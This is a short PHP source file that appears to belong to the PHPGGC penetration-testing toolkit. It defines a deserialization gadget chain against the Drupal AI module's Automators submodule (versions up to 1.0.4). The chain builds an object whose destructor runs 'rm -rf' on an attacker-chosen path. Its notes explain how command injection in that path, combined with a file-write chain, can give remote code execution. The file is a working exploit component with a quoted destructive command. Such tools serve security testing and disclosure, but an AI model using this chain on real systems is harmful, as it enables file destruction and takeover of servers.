<?php

namespace GadgetChain\Drupal;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = 'Drupal AI module <= 1.0.4';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = '
        This specifically requires the AI Automators submodule to be enabled.
        Can also achieve RCE via command injection in the filename, but the path
        must pass a check with file_exists(). This could be used in combination
        with a File Write gadget chain to achieve RCE (useful if that FW gadget
        cannot write to a file directly executable via the webserver). The
        vulnerable destructor does this: exec(\'rm -rf \' . $this->tmpDir);
    ';

    public function generate(array $parameters)
    {
        return new \Drupal\ai_automators\PluginBaseClasses\VideoToText($parameters['remote_path']);
    }
}
